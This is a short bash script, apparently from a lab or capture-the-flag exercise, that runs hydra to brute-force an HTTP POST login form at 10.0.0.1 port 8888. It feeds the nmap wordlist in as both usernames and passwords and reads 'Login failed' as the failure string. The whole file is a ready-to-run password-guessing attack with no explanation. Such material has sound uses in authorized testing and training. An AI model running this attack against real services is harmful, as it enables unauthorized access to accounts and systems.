#!/bin/bash

hydra -L /usr/share/wordlists/nmap.lst -P /usr/share/wordlists/nmap.lst 10.0.0.1 -s 8888 http-post-form "/:uname=^USER^&psw=^PASS^&Login=Login:Login failed"
